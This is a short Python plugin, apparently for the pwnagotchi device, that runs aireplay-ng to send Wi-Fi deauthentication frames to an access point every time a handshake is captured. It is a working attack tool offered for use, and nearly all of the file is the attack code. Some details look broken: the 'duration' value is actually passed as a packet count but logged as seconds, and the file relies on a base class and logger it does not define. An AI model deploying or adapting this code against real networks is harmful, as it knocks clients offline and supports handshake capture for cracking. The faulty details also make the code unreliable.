import time
import subprocess
from pwnagotchi.plugins import BasePlugin

class Deauthenticator(BasePlugin):
    __author__ = 'Deus Dust'
    __version__ = '1.0.0'
    __license__ = 'MIT'

    def __init__(self):
        super(Deauthenticator, self).__init__()

    def deauth(self, target_mac, interface="wlan0", duration=5):
        try:
            subprocess.run(["aireplay-ng", "--deauth", str(duration), "-a", target_mac, interface], check=True)
            self.log.info(f"Deauthentication attack sent to {target_mac} for {duration} seconds")
        except subprocess.CalledProcessError as e:
            self.log.error(f"Failed to send deauthentication attack: {e}")

    def on_loaded(self):
        self.log.info("Deauthenticator Plugin loaded")

    def on_handshake(self, agent, filename, access_point):
        target_mac = access_point.bssid
        self.deauth(target_mac)

    def on_unload(self):
        self.log.info("Deauthenticator Plugin unloaded")

# Instantiate the plugin
plugin = Deauthenticator()
